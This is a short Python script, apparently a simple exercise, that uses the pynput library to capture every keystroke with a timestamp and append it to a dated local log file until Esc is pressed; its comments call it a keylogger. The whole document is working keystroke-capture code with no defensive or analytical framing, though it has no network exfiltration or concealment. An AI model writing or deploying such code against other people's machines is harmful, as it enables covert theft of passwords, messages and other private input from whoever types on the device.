from pynput import keyboard
from datetime import datetime


log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"  #current time and date


def on_press(key):  #when key is pressed
    time_stamp = datetime.now().strftime("[%H:%M:%S] ")
    try:
        with open(log_file, "a") as f:
            f.write(time_stamp + key.char + "\n")
    except AttributeError:
        with open(log_file, "a") as f:  #for special attributes like space and some special symbols
            f.write(time_stamp + f"[{str(key)}]\n")

def on_release(key):  #to stop running the keylogger file
    if key == keyboard.Key.esc:
        return False  

with keyboard.Listener(on_press=on_press, on_release=on_release) as l:  #starting of keylogger
    l.join()